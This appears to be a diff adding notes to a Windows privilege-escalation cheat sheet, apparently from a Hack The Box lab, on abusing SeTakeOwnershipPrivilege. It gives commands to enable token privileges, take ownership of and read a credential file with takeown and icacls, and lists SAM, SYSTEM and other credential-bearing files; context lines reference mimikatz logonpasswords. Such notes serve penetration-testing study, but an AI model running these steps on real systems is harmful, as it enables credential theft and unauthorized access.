@@ -87,3 +87,73 @@ sekurlsa::logonpasswords
 also
 
 https://decoder.cloud/2018/02/02/getting-system/
+
+# SeTakeOwnershipPrivilege
+This privilege assigns WRITE_OWNER rights over an object
+### Example of privs
+```
+PS C:\Windows\system32> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
+```
+```
+import-module .\EnableAllTokenPrivs.ps1
+```
+```
+.\EnableAllTokenPrivs.ps1
+```
+```
+PS C:\tools> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== =======
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+```
+### Choosing a target file
+```
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+```
+### Checking File Ownership
+```
+cmd /c dir /q 'C:\Department Shares\Private\IT'
+```
+### Taking Ownership of the File
+```
+takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+```
+### Verify Ownership
+```
+Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+```
+### Grant user full privileges over the target file
+```
+icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
+```
+### Viewing the file
+```
+cat 'C:\Department Shares\Private\IT\cred.txt'
+```
+### Files of interest
+```
+c:\inetpub\wwwwroot\web.config
+%WINDIR%\repair\sam
+%WINDIR%\repair\system
+%WINDIR%\repair\software, %WINDIR%\repair\security
+%WINDIR%\system32\config\SecEvent.Evt
+%WINDIR%\system32\config\default.sav
+%WINDIR%\system32\config\security.sav
+%WINDIR%\system32\config\software.sav
+%WINDIR%\system32\config\system.sav
+```
